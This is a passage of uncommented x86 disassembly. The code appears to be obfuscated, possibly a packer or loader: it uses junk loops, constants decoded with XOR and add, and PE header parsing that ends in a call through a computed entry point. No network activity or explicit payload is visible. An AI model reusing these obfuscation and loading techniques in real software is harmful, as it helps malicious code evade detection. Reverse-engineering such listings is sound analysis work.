  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e776,0x43049a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4304a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ee2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ee2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ee2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ebb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ee2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ee2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e76a
  409527:	or     edi,DWORD PTR ds:0x43053e
  40952d:	mov    DWORD PTR ds:0x42e76a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4304a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43049a
  40955e:	sbb    DWORD PTR ds:0x42ee0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ee24,0x19
  409570:	cmp    DWORD PTR ds:0x42ee24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ee24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eab8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ee24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ee24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e75e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e75e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e75e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e75e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e75e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ebbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e762,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4304a2
  409649:	sub    DWORD PTR ds:0x43048a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ee2c,0x4304a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4304aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e76e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e75e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e75e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e75e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ead4
  4096b3:	cmp    DWORD PTR ds:0x42e75e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e75e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e75e,eax
  4096cb:	mov    eax,ds:0x42e75e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e75e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ee24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ee24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ee24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ee24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ee24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430492
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ebc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43048a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ee2c
  409763:	call   DWORD PTR ds:0x42ebc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4304ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43054e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee18
  4097a8:	sub    DWORD PTR ds:0x42e762,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430546
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e75a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e75a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e75a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e75a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430556
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ead8
  4097f0:	cmp    DWORD PTR ds:0x42e75a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e75a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e75a,edx
  40980a:	cmp    DWORD PTR ds:0x42e75a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430542,0x1c
  40982b:	cmp    DWORD PTR ds:0x430542,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430542,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ebc8
  409850:	cmp    DWORD PTR ds:0x430542,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430542
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430542,edx
  40986a:	mov    edx,DWORD PTR ds:0x430542
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430542,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43054a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4304a2,0x42e772
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4304ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4304ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4304ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4304ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4304ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ebcc
  4098eb:	cmp    DWORD PTR ds:0x4304ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4304ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4304ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4304c2,0x4304a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee1c,0x42e76e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee14
  409945:	inc    eax
  409946:	mov    ds:0x42ee14,eax
  40994b:	cmp    DWORD PTR ds:0x42ee14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eae0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43049e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e75e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4304c2
  409998:	xor    ecx,DWORD PTR ds:0x4304be
  40999e:	mov    DWORD PTR ds:0x4304c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4304b6,0x42ee14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e76a,0x42ee08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4304ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4304b2,0x4304c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e75e,0x42e76a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e772,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430546,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e75a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430486,0x430552
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e75e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43055a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e76e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e76e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43049a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e75e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43054e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4304be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43055a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43054a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430552,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee0c,0x42e75e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4304ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430546,0x42ee28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e76a,0x43049a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4304aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e75e,0x43054e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4304c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ee28,0x430496
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ee24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430486,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430496
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4304a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43048e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4304ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4304a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e776,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4304be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430542,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430546,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430546,0x42ee0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
